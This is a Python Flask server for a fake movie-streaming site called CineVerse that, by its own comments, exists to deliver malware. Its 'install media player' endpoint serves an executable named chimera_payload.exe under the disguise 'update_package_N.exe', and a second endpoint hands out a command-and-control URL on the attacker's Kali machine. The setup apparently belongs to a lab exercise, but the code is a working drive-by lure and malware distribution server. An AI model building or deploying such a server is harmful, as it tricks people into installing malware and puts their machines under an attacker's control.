# ============================================
# CineVerse - Movie Website Server
# Serves the movie website and delivers payload
# ============================================

from flask import Flask, send_from_directory, send_file, jsonify, request
import os
import json
import time
import socket

app = Flask(__name__)

# ============================================
# CONFIGURATION
# ============================================

WEBSITE_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(WEBSITE_DIR, 'system')
PAYLOAD_PATH = os.path.join(PAYLOAD_DIR, "chimera_payload.exe")

print(f"[*] Website Dir: {WEBSITE_DIR}")
print(f"[*] Payload Dir: {PAYLOAD_DIR}")
print(f"[*] Payload Path: {PAYLOAD_PATH}")
print(f"[*] Payload exists: {os.path.exists(PAYLOAD_PATH)}")

# Get Kali IP dynamically
def get_kali_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "10.0.2.8"

KALI_IP = get_kali_ip()
print(f"[*] Kali IP detected: {KALI_IP}")

# ============================================
# ROUTES
# ============================================

@app.route('/')
def index():
    """Serve the main homepage."""
    return send_from_directory(WEBSITE_DIR, 'index.html')

@app.route('/css/<path:filename>')
def serve_css(filename):
    return send_from_directory(os.path.join(WEBSITE_DIR, 'css'), filename)

@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(os.path.join(WEBSITE_DIR, 'js'), filename)

@app.route('/images/<path:filename>')
def serve_images(filename):
    return send_from_directory(os.path.join(WEBSITE_DIR, 'images'), filename)

@app.route('/api/install/player', methods=['POST'])
def install_media_player():
    """Deliver the malware payload."""
    try:
        data = request.json
        movie_id = data.get('movie_id', 1)
        movie_title = data.get('movie_title', 'Unknown')
        
        print(f"[*] Payload requested for: {movie_title} (ID: {movie_id})")
        print(f"[*] From IP: {request.remote_addr}")
        print(f"[*] Payload path: {PAYLOAD_PATH}")
        print(f"[*] Payload exists: {os.path.exists(PAYLOAD_PATH)}")
        
        if os.path.exists(PAYLOAD_PATH):
            print(f"[*] Sending payload...")
            return send_file(
                PAYLOAD_PATH,
                as_attachment=True,
                download_name=f'update_package_{movie_id}.exe',
                mimetype='application/octet-stream'
            )
        else:
            print(f"[!] Payload not found at: {PAYLOAD_PATH}")
            return jsonify({'status': 'error', 'message': 'Payload not available'}), 404
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/ip', methods=['GET'])
def get_ip():
    return jsonify({'ip': KALI_IP, 'c2_url': f'http://{KALI_IP}:8080'})

# ============================================
# SERVER STARTUP
# ============================================

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║    🎬 CineVerse Media Server                              ║
    ║    URL: http://0.0.0.0:8000                               ║
    ║    Kali IP: {}                                            ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """.format(KALI_IP))
    
    app.run(host='0.0.0.0', port=8000, debug=True)

